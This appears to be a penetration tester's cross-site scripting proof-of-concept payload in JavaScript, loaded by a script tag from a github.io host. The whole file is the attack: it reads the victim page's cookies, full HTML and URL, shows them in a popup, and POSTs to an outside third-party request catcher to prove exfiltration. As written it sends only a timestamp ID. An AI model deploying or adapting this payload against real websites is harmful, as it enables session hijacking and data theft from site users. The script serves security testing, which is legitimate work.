//Authoer: JDL
//<script src="https://jdl-84.github.io/CACHE-XSS/XSS.js"></script> 

//Update Title for confirmation script loaded
//We're not trying to be surreptitious about the app testing
document.title = "XSS-Active"

//APP SPECIFIC 
//Put Back the variable used to invoke the XSS
var websession  = '1';
var mysessionno  = '1';
var CurrDT          = new Date();
var TimeAsMS        = CurrDT.getTime();
var LastRefresh = TimeAsMS;
var timeoutlength = 9999000;
//////////

//Get Secrets for display 
var UsersCookie = document.cookie;
var DocHTML = document.getElementsByTagName('html')[0].innerHTML;
var DocLocation = document.location.href;


var Toilet = "https://ptsv2.com/t/qo33d-1598654477";

function ExfiltrateData(ID)
{	
	 //The popup proves we can obtain the data. 
	 //Now we need to prove we can move it else where.
	 //We can't post anything that would indentify the application we've used this script against. 
	 //ID is the current Timestamp in MS. 	 
	 //Send Request to Toilet - Thirdparty POST catcher. 
	 const xhr = new XMLHttpRequest();
	 xhr.open("POST", Toilet+"/post", true);
	 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	 xhr.send("XSS-TEST-"+ID);	
}

function BuildTitle(doc,name)
{
	var header = doc.document.createElement("h4");
	header.style = "color:fff;";
	header.innerHTML = name;
	doc.document.body.appendChild(header);
}

function BuildTextArea(doc,height,data)
{
	var TextAreaStyle = "width:100%;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
	var txtArea = doc.document.createElement("TEXTAREA");
	txtArea.innerHTML = data;
	txtArea.style = "height:"+height+"px;"+TextAreaStyle;
	doc.document.body.appendChild(txtArea);
}

function BuildButton(href,doc,val)
{
	var aExData = doc.document.createElement("a");
	aExData.style = "color:000;margin-Top:15px;margin-left:0px;margin-right:0px;box-shadow:inset 0px 1px 0px 0px #ffffff;	background:linear-gradient(to bottom, #ffffff 5%, #f6f6f6 100%);	background-color:#ffffff;	border-radius:6px;	border:1px solid #dcdcdc;	display:block;	cursor:pointer;	color:#666666;	font-family:Arial;	font-size:15px;	font-weight:bold;	padding:6px 24px;	text-decoration:none;	text-shadow:0px 1px 0px #ffffff;";
	aExData.innerHTML = val;
	aExData.href = href;
	aExData.target="_blank";
	doc.document.body.appendChild(aExData);
}

function createPopup(){

var popup = open("", "", "width=800,height=600,toolbar=0,menubar=0,location=0,scrollbars=0,resizable=0");
popup.document.body.style.background = "rgb(53, 53, 53)";
popup.document.title = "XSS Data";
//URL Header
BuildTitle(popup,"Document Location");
//URL Doc
BuildTextArea(popup,20, DocLocation);

//Cookie Doc Header
BuildTitle(popup,"Document Cookie");

//Cookie Doc
BuildTextArea(popup,100, UsersCookie);

//Doc Header
BuildTitle(popup,"Document Inner HTML");
//Cookie Doc
BuildTextArea(popup,100, DocHTML);

//URL Header
BuildTitle(popup,"Exfiltration ID");
//URL Doc
BuildTextArea(popup,20, TimeAsMS);

//ExfiltrateData

BuildButton(Toilet,popup,"Check Data Was Exfiltrated");

}

ExfiltrateData(TimeAsMS);
createPopup();
